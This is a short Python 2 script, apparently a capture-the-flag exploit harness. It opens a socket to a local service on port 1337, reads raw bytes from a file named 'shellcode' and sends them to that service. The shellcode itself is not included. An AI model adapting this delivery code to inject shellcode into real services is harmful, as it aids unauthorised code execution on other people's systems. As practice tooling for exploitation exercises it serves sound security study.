#!/usr/bin/env python

TARGET = ("127.0.0.1", 1337)

#~~~~~~~~~
import sys, os, socket, struct
DEBUG  = 'DEBUG' in sys.argv
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(TARGET)
def p(a):
  return struct.pack('I', a)
def send(dat):
    sock.send(dat)
def recv(num = 1024):
    res = sock.recv(num)
    if DEBUG:
        print res
    return res
def comm(dat):
    send(dat)
    return recv()
def close():
    sock.close()
def recv_and_close():
    while recv():
        pass
    close()
#~~~~~~~~~

with open('shellcode') as f:
  shellcode = f.read()

send(shellcode)

recv_and_close()
